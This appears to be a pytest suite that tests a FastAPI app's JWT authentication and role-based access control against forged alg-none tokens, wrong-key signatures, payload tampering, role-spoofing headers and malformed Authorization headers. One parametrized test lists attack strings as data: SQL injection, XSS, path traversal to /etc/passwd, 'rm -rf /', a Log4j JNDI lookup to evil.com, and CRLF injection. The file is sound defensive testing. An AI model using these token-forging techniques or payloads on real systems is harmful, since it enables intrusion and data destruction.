"""
Adversarial Challenger Test Suite for Milestone 2: Authentication & RBAC Layer.

Empirical challenge tests targeting:
1. Malformed, tampered, and forged JWT tokens (alg none, algorithm confusion, wrong keys, corrupted signatures/payloads).
2. Expired tokens, missing claims (role, sub, exp), unauthorized/spoofed role claims.
3. Operator role privilege escalation attempts against all manager endpoints and via header/query/body injections.
4. Authorization header injection, missing prefixes, wrong schemes, malformed formats, and fuzzing payloads.
5. Mock OAuth login and token refresh boundary attacks.
"""
import time
import json
import base64
import hmac
import hashlib
import pytest
from fastapi import status
from fastapi.testclient import TestClient

from backend.app.config import settings
from backend.app.core.security import generate_jwt_token, decode_jwt_token, get_password_hash, verify_password
from backend.app.schemas.auth import UserProfile


def _urlsafe_b64encode(data: bytes) -> str:
    """Encodes bytes to base64url string without trailing '=' padding."""
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def _urlsafe_b64decode(s: str) -> bytes:
    """Decodes base64url string into bytes, restoring '=' padding."""
    padding = "=" * (4 - len(s) % 4) if len(s) % 4 != 0 else ""
    return base64.urlsafe_b64decode(s + padding)


def create_raw_jwt(header: dict, payload: dict, secret: str = None) -> str:
    """Creates a raw JWT with arbitrary header, payload, and optional signature."""
    secret_key = secret if secret is not None else settings.JWT_SECRET
    header_json = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_json = json.dumps(payload, separators=(",", ":")).encode("utf-8")

    header_b64 = _urlsafe_b64encode(header_json)
    payload_b64 = _urlsafe_b64encode(payload_json)
    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")

    if header.get("alg") == "none":
        sig_b64 = ""
    else:
        sig = hmac.new(secret_key.encode("utf-8"), signing_input, hashlib.sha256).digest()
        sig_b64 = _urlsafe_b64encode(sig)

    return f"{header_b64}.{payload_b64}.{sig_b64}"


# ===========================================================================
# 1. Cryptographic & Algorithm Confusion Attacks
# ===========================================================================

class TestJWTCryptographicAttacks:
    """Adversarially challenge cryptographic signature verification and algorithm safety."""

    @pytest.mark.parametrize("none_alg", ["none", "None", "NONE", "nOnE"])
    def test_alg_none_vulnerability_rejected(self, client: TestClient, none_alg: str):
        """Verify RFC 7515 'alg: none' signature bypass attacks are strictly rejected."""
        header = {"alg": none_alg, "typ": "JWT"}
        payload = {
            "sub": "attacker_root",
            "role": "Manager",
            "email": "attacker@bharattrip.com",
            "exp": int(time.time()) + 3600,
        }
        # Token with empty signature segment
        token_empty_sig = f"{_urlsafe_b64encode(json.dumps(header).encode())}.{_urlsafe_b64encode(json.dumps(payload).encode())}."
        
        # Test core decoder rejection
        with pytest.raises(ValueError):
            decode_jwt_token(token_empty_sig)

        # Test API endpoint rejection
        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token_empty_sig}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

        # Test finance manager endpoint rejection
        resp_fin = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token_empty_sig}"})
        assert resp_fin.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("bad_alg", ["RS256", "ES256", "HS512", "HS384", "RSA", "DSA", "MD5", "UNKNOWN"])
    def test_unsupported_algorithms_rejected(self, client: TestClient, bad_alg: str):
        """Verify tokens claiming algorithms other than HS256 fail cryptographic validation."""
        header = {"alg": bad_alg, "typ": "JWT"}
        payload = {
            "sub": "user_mgr_01",
            "role": "Manager",
            "exp": int(time.time()) + 3600,
        }
        # Sign with dummy HMAC key
        fake_token = create_raw_jwt(header, payload, secret="some-key")

        with pytest.raises(ValueError):
            decode_jwt_token(fake_token)

        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {fake_token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("rogue_secret", [
        "wrong_secret_key_12345",
        "secret",
        "super-secret",
        "",
        "dev_secret_key",
        "null",
        "12345678",
        "super-secret-key-bharattrip-ssot-2025",
    ])
    def test_wrong_secret_key_signature_mismatch(self, client: TestClient, rogue_secret: str):
        """Verify tokens signed with any rogue or incorrect secret keys are rejected."""
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": "user_mgr_01",
            "role": "Manager",
            "exp": int(time.time()) + 3600,
        }
        rogue_token = create_raw_jwt(header, payload, secret=rogue_secret)

        with pytest.raises(ValueError, match="signature|HMAC mismatch"):
            decode_jwt_token(rogue_token)

        resp = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {rogue_token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    def test_payload_tampering_role_escalation_detection(self, client: TestClient):
        """Verify tampering payload from Operator to Manager without valid re-signing fails."""
        # Generate valid Operator token
        valid_op_token = generate_jwt_token(role="Operator")
        parts = valid_op_token.split(".")
        assert len(parts) == 3

        # Decode valid payload and escalate role
        payload_json = _urlsafe_b64decode(parts[1]).decode("utf-8")
        payload = json.loads(payload_json)
        payload["role"] = "Manager"
        payload["sub"] = "user_mgr_01"

        # Re-encode payload but preserve original signature
        tampered_payload_b64 = _urlsafe_b64encode(json.dumps(payload).encode("utf-8"))
        tampered_token = f"{parts[0]}.{tampered_payload_b64}.{parts[2]}"

        # Must fail signature verification
        with pytest.raises(ValueError, match="signature|HMAC mismatch"):
            decode_jwt_token(tampered_token)

        resp = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {tampered_token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("sig_mutation", [
        lambda sig: sig[:-5],                          # Truncated signature
        lambda sig: sig + "AAAA",                      # Appended characters
        lambda sig: "A" * len(sig),                    # Constant signature
        lambda sig: ("Z" if sig[0] != "Z" else "Y") + sig[1:], # Bit flip at start
        lambda sig: sig[:-1] + ("Z" if sig[-1] != "Z" else "Y"), # Bit flip at end
        lambda sig: "",                                # Empty signature
        lambda sig: "!@#$%^&*()",                      # Invalid base64 characters
    ])
    def test_signature_mutations_and_bitflips(self, client: TestClient, sig_mutation):
        """Verify all variations of corrupted or mutated signatures are safely rejected."""
        valid_token = generate_jwt_token(role="Manager")
        header_b64, payload_b64, sig_b64 = valid_token.split(".")
        mutated_sig = sig_mutation(sig_b64)
        corrupted_token = f"{header_b64}.{payload_b64}.{mutated_sig}"

        with pytest.raises(ValueError):
            decode_jwt_token(corrupted_token)

        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {corrupted_token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("invalid_token_format", [
        "",
        "single_segment_token",
        "segment1.segment2",
        "segment1.segment2.segment3.segment4",
        "segment1.segment2.segment3.segment4.segment5",
        "....",
        "null",
        "None",
        "Bearer",
        "{'alg':'HS256'}.{'sub':'1'}.sig",
    ])
    def test_malformed_token_segment_structures(self, client: TestClient, invalid_token_format: str):
        """Verify tokens with non-3-dot structures raise ValueError and 401."""
        with pytest.raises(ValueError):
            decode_jwt_token(invalid_token_format)

        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {invalid_token_format}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("non_string_input", [
        None,
        12345,
        12.34,
        ["header", "payload", "sig"],
        {"token": "jwt"},
        b"header.payload.sig",
    ])
    def test_non_string_token_types_raise_value_error(self, non_string_input):
        """Verify passing non-string data types to decode_jwt_token safely raises ValueError without crash."""
        with pytest.raises(ValueError, match="Invalid JWT token: token must be a non-empty string."):
            decode_jwt_token(non_string_input)


# ===========================================================================
# 2. Claims & Expiration Attacks
# ===========================================================================

class TestClaimsAndExpirationAttacks:
    """Adversarially challenge token expiration, temporal claims, and payload schema variations."""

    @pytest.mark.parametrize("exp_offset", [
        -1,       # Expired 1 second ago
        -60,      # Expired 1 minute ago
        -3600,    # Expired 1 hour ago
        -86400,   # Expired 1 day ago
        -31536000 # Expired 1 year ago
    ])
    def test_expired_token_deltas(self, client: TestClient, exp_offset: int):
        """Verify tokens expired by various time offsets are rejected."""
        now = int(time.time())
        token = generate_jwt_token(
            claims={"exp": now + exp_offset},
            role="Manager"
        )
        with pytest.raises(ValueError, match="expired"):
            decode_jwt_token(token)

        resp = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("bad_exp", [0, -1, -999999999])
    def test_epoch_zero_and_negative_exp_timestamps(self, client: TestClient, bad_exp: int):
        """Verify epoch 0 and negative timestamps are strictly treated as expired."""
        token = generate_jwt_token(claims={"exp": bad_exp}, role="Manager")
        with pytest.raises(ValueError, match="expired"):
            decode_jwt_token(token)

        resp = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    def test_token_missing_role_claim_defaults_safely_to_operator(self, client: TestClient):
        """Verify token missing 'role' claim defaults to 'Operator' and is denied Manager endpoints."""
        now = int(time.time())
        # Manually construct valid token without 'role' claim
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": "user_mystery_01",
            "email": "mystery@bharattrip.com",
            "exp": now + 3600,
        }
        token = create_raw_jwt(header, payload)
        
        # Profile endpoint should reflect default Operator role
        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == status.HTTP_200_OK
        data = resp.json()
        assert data["role"] == "Operator"

        # Manager endpoint MUST reject with 403 Forbidden
        fin_resp = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token}"})
        assert fin_resp.status_code == status.HTTP_403_FORBIDDEN

    @pytest.mark.parametrize("unauthorized_role", [
        "SuperAdmin",
        "Admin",
        "Root",
        "Auditor",
        "FinanceManager",
        "manager",       # Lowercase variation
        "MANAGER",       # Uppercase variation
        "Operator;Manager",
        "Guest",
        "Anonymous",
    ])
    def test_unauthorized_custom_roles_denied_manager_endpoints(self, client: TestClient, unauthorized_role: str):
        """Verify non-whitelisted roles in token are rejected from Manager-restricted endpoints with 403."""
        token = generate_jwt_token(claims={"role": unauthorized_role})
        
        # Profile returns the role
        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == status.HTTP_200_OK
        assert resp.json()["role"] == unauthorized_role

        # Restricted endpoints strictly require exact "Manager"
        resp_fin = client.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token}"})
        assert resp_fin.status_code == status.HTTP_403_FORBIDDEN

    @pytest.mark.parametrize("weird_role_type", [
        ["Manager"],                    # List instead of string
        {"name": "Manager"},            # Dict instead of string
        12345,                          # Int
        True,                           # Bool
        None,                           # Null
    ])
    def test_malformed_role_types_in_token_do_not_escalate(self, client: TestClient, weird_role_type):
        """Verify non-string role types in payload cannot bypass Manager RBAC guard."""
        now = int(time.time())
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "sub": "user_exploit_01",
            "role": weird_role_type,
            "exp": now + 3600,
        }
        token = create_raw_jwt(header, payload)

        client_no_raise = TestClient(client.app, raise_server_exceptions=False)
        resp_fin = client_no_raise.get("/api/v1/finance-records", headers={"Authorization": f"Bearer {token}"})
        # Privilege escalation MUST NOT succeed (must not be 200 OK)
        assert resp_fin.status_code != status.HTTP_200_OK
        assert resp_fin.status_code != status.HTTP_201_CREATED
        assert resp_fin.status_code in (
            status.HTTP_403_FORBIDDEN,
            status.HTTP_401_UNAUTHORIZED,
            status.HTTP_422_UNPROCESSABLE_ENTITY,
            status.HTTP_500_INTERNAL_SERVER_ERROR,
        )

    def test_token_missing_sub_defaults_gracefully(self, client: TestClient):
        """Verify token missing 'sub' claim defaults safely to 'user_01' without 500 error."""
        now = int(time.time())
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {
            "role": "Operator",
            "email": "user@bharattrip.com",
            "exp": now + 3600,
        }
        token = create_raw_jwt(header, payload)
        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {token}"})
        assert resp.status_code == status.HTTP_200_OK
        data = resp.json()
        assert data["user_id"] == "user_01"


# ===========================================================================
# 3. Privilege Escalation & Route Guard Attacks
# ===========================================================================

class TestPrivilegeEscalationAndRBACGuards:
    """Adversarially challenge RBAC isolation across all Manager endpoints and methods."""

    def test_operator_blocked_from_all_finance_crud_methods(self, client: TestClient, operator_auth_headers: dict, sample_finance_record):
        """
        Verify Operator token is strictly denied (HTTP 403) across all HTTP methods on Finance endpoints:
        - GET /api/v1/finance-records
        - POST /api/v1/finance-records
        - GET /api/v1/finance-records/{ref_no}
        - PATCH /api/v1/finance-records/{ref_no}
        - PUT /api/v1/finance-records/{ref_no}
        - DELETE /api/v1/finance-records/{ref_no}
        """
        ref_no = sample_finance_record.ref_no

        # 1. GET list
        resp_list = client.get("/api/v1/finance-records", headers=operator_auth_headers)
        assert resp_list.status_code == status.HTTP_403_FORBIDDEN, f"GET list failed: {resp_list.status_code}"

        # 2. POST create
        create_payload = {
            "Ref No": "RF-8888",
            "Agent Name": "Hacker Agency",
            "Sector": "DEL-BOM",
            "Amount Paid (INR)": 50000.0,
        }
        resp_create = client.post("/api/v1/finance-records", json=create_payload, headers=operator_auth_headers)
        assert resp_create.status_code == status.HTTP_403_FORBIDDEN, f"POST create failed: {resp_create.status_code}"

        # 3. GET detail
        resp_get = client.get(f"/api/v1/finance-records/{ref_no}", headers=operator_auth_headers)
        assert resp_get.status_code == status.HTTP_403_FORBIDDEN, f"GET detail failed: {resp_get.status_code}"

        # 4. PATCH update
        patch_payload = {"Payout Status": "Approved by Attacker"}
        resp_patch = client.patch(f"/api/v1/finance-records/{ref_no}", json=patch_payload, headers=operator_auth_headers)
        assert resp_patch.status_code == status.HTTP_403_FORBIDDEN, f"PATCH update failed: {resp_patch.status_code}"

        # 5. PUT update
        put_payload = {"Payout Status": "Refund Done"}
        resp_put = client.put(f"/api/v1/finance-records/{ref_no}", json=put_payload, headers=operator_auth_headers)
        assert resp_put.status_code == status.HTTP_403_FORBIDDEN, f"PUT update failed: {resp_put.status_code}"

        # 6. DELETE
        resp_del = client.delete(f"/api/v1/finance-records/{ref_no}", headers=operator_auth_headers)
        assert resp_del.status_code == status.HTTP_403_FORBIDDEN, f"DELETE failed: {resp_del.status_code}"

    @pytest.mark.parametrize("header_name,header_val", [
        ("X-Role", "Manager"),
        ("X-User-Role", "Manager"),
        ("X-Original-Role", "Manager"),
        ("X-Forwarded-Role", "Manager"),
        ("X-Admin", "true"),
        ("X-Override-Role", "Manager"),
        ("Role", "Manager"),
        ("X-Authenticated-Role", "Manager"),
    ])
    def test_header_injection_role_override_rejected(self, client: TestClient, operator_auth_headers: dict, header_name: str, header_val: str):
        """Verify custom request headers cannot override or spoof the JWT role claim."""
        headers = dict(operator_auth_headers)
        headers[header_name] = header_val

        resp = client.get("/api/v1/finance-records", headers=headers)
        assert resp.status_code == status.HTTP_403_FORBIDDEN

    @pytest.mark.parametrize("query_param", [
        {"role": "Manager"},
        {"user_role": "Manager"},
        {"as_manager": "true"},
        {"is_admin": "1"},
        {"override": "Manager"},
    ])
    def test_query_parameter_pollution_role_escalation_rejected(self, client: TestClient, operator_auth_headers: dict, query_param: dict):
        """Verify query parameters cannot override RBAC role checks."""
        resp = client.get("/api/v1/finance-records", params=query_param, headers=operator_auth_headers)
        assert resp.status_code == status.HTTP_403_FORBIDDEN

    def test_body_injection_role_escalation_rejected(self, client: TestClient, operator_auth_headers: dict):
        """Verify embedding role='Manager' in JSON body payload does not escalate privileges."""
        body = {
            "Ref No": "RF-7777",
            "Agent Name": "Test Agent",
            "role": "Manager",
            "user_profile": {"role": "Manager"},
        }
        resp = client.post("/api/v1/finance-records", json=body, headers=operator_auth_headers)
        assert resp.status_code == status.HTTP_403_FORBIDDEN

    @pytest.mark.parametrize("illegal_role", [
        "SuperAdmin",
        "Admin",
        "Root",
        "System",
        "Executive",
        "Manager; DROP TABLE users;",
        "",
        "   ",
        "manager",
        "OPERATOR",
    ])
    def test_mock_login_arbitrary_role_injection_rejected(self, client: TestClient, illegal_role: str):
        """Verify mock login endpoint rejects non-standard or malicious role strings."""
        resp = client.post("/api/v1/auth/mock-login", json={"role": illegal_role})
        assert resp.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    def test_token_refresh_cannot_escalate_role(self, client: TestClient, operator_auth_headers: dict):
        """Verify refreshing an Operator token produces a new token that remains an Operator."""
        resp = client.post("/api/v1/auth/refresh", headers=operator_auth_headers)
        assert resp.status_code == status.HTTP_200_OK
        data = resp.json()
        new_token = data["access_token"]

        # Verify claims on refreshed token
        claims = decode_jwt_token(new_token)
        assert claims["role"] == "Operator"

        # Refreshed token must still be denied Manager endpoints
        refreshed_headers = {"Authorization": f"Bearer {new_token}"}
        resp_fin = client.get("/api/v1/finance-records", headers=refreshed_headers)
        assert resp_fin.status_code == status.HTTP_403_FORBIDDEN


# ===========================================================================
# 4. Authorization Header Injection & Fuzzing
# ===========================================================================

class TestAuthorizationHeaderInjectionAndFuzzing:
    """Adversarially challenge Authorization header parsing, whitespace handling, and injection."""

    @pytest.mark.parametrize("malformed_header", [
        "",                             # Empty header
        "   ",                          # Whitespace only
        "\t",                           # Tab character
        "\r\n",                         # CRLF
        "Bearer",                       # Missing token part
        "Bearer ",                      # Trailing space with empty token
        "Bearer \t",                    # Trailing tab
        "Bearer   ",                    # Multiple spaces
        "Basic dXNlcjpwYXNz",           # Basic auth scheme
        "Digest username=admin",        # Digest scheme
        "OAuth ya29.a0AfH6SM...",       # OAuth scheme
        "Token abcdef123456",           # Token scheme
        "BearerToken eyJhbGciOi...",    # Concatenated scheme
        "Bearer tok1 tok2",             # Extra segment
        "Bearer Bearer eyJhbGciOi...",  # Duplicate Bearer keyword
        "Bearer: eyJhbGciOi...",        # Colon in Bearer prefix
    ])
    def test_malformed_authorization_headers_rejected(self, client: TestClient, malformed_header: str):
        """Verify malformed Authorization headers return HTTP 401 Unauthorized."""
        headers = {"Authorization": malformed_header} if malformed_header else {}
        resp = client.get("/api/v1/auth/me", headers=headers)
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED
        assert "WWW-Authenticate" in resp.headers

    @pytest.mark.parametrize("bearer_case", [
        "Bearer",
        "bearer",
        "BEARER",
        "bEaReR",
    ])
    def test_bearer_case_insensitivity_standard_compliance(self, client: TestClient, bearer_case: str):
        """Verify RFC 6750 case-insensitive Bearer prefix parsing for valid tokens."""
        token = generate_jwt_token(role="Manager")
        headers = {"Authorization": f"{bearer_case} {token}"}
        resp = client.get("/api/v1/auth/me", headers=headers)
        assert resp.status_code == status.HTTP_200_OK
        assert resp.json()["role"] == "Manager"

    @pytest.mark.parametrize("injection_payload", [
        "Bearer ' OR '1'='1",
        "Bearer ' UNION SELECT * FROM users --",
        "Bearer <script>alert(document.cookie)</script>",
        "Bearer <img src=x onerror=alert(1)>",
        "Bearer ../../../../../../../etc/passwd",
        "Bearer ; rm -rf / ;",
        "Bearer {{7*7}}",
        "Bearer ${jndi:ldap://evil.com/a}",
        "Bearer \x00nullbyte",
        "Bearer \r\nSet-Cookie: session=hacked",
    ])
    def test_security_injection_payloads_in_authorization_header(self, client: TestClient, injection_payload: str):
        """Verify SQLi, XSS, Path Traversal, Log4j, and CRLF payloads in Auth header return 401."""
        resp = client.get("/api/v1/auth/me", headers={"Authorization": injection_payload})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED

    def test_oversized_authorization_header_fuzzing(self, client: TestClient):
        """Verify giant 50KB token strings are safely rejected with 401 without crashing the server."""
        giant_token = "A" * 50000
        resp = client.get("/api/v1/auth/me", headers={"Authorization": f"Bearer {giant_token}"})
        assert resp.status_code == status.HTTP_401_UNAUTHORIZED


# ===========================================================================
# 5. Mock Login & Auth Schema Boundary Tests
# ===========================================================================

class TestMockLoginAndSchemaBoundaries:
    """Stress test mock login endpoint inputs, payload validation, and user profile integrity."""

    @pytest.mark.parametrize("invalid_body", [
        {},                                         # Missing role
        {"username": "user1"},                      # Missing role
        {"role": 12345},                            # Non-string role
        {"role": ["Manager"]},                      # Array role
        {"role": None},                             # Null role
        {"role": True},                             # Boolean role
    ])
    def test_mock_login_schema_validation_failures(self, client: TestClient, invalid_body: dict):
        """Verify invalid schema structures on mock-login return 422 Unprocessable Entity."""
        resp = client.post("/api/v1/auth/mock-login", json=invalid_body)
        assert resp.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    @pytest.mark.parametrize("custom_username", [
        "john.doe@bharattrip.com",
        "admin_lead_01",
        "operator_mumbai_desk",
        "अदिति_शर्मा",                              # Unicode Devanagari
        "user_with_emoji_🚀🎉",
        "user-with-hyphens_and.dots",
        "a" * 255,                                  # Long username
    ])
    def test_mock_login_custom_usernames_preserved(self, client: TestClient, custom_username: str):
        """Verify valid custom usernames are preserved in token and profile."""
        resp = client.post("/api/v1/auth/mock-login", json={"role": "Operator", "username": custom_username})
        assert resp.status_code == status.HTTP_200_OK
        data = resp.json()
        assert data["user_profile"]["user_id"] == custom_username
        
        # Verify encoded JWT contains the exact subject
        claims = decode_jwt_token(data["access_token"])
        assert claims["sub"] == custom_username

    def test_password_hashing_cryptographic_primitives(self):
        """Verify backend.app.core.security password hashing functions."""
        pwd1 = "SecretPassword!2026"
        pwd2 = "DifferentPassword!2026"

        hash1 = get_password_hash(pwd1)
        hash2 = get_password_hash(pwd2)

        assert hash1 != hash2
        assert len(hash1) == 64  # SHA-256 hex string

        assert verify_password(pwd1, hash1) is True
        assert verify_password(pwd2, hash2) is True
        assert verify_password("WrongPassword", hash1) is False
        assert verify_password("", hash1) is False
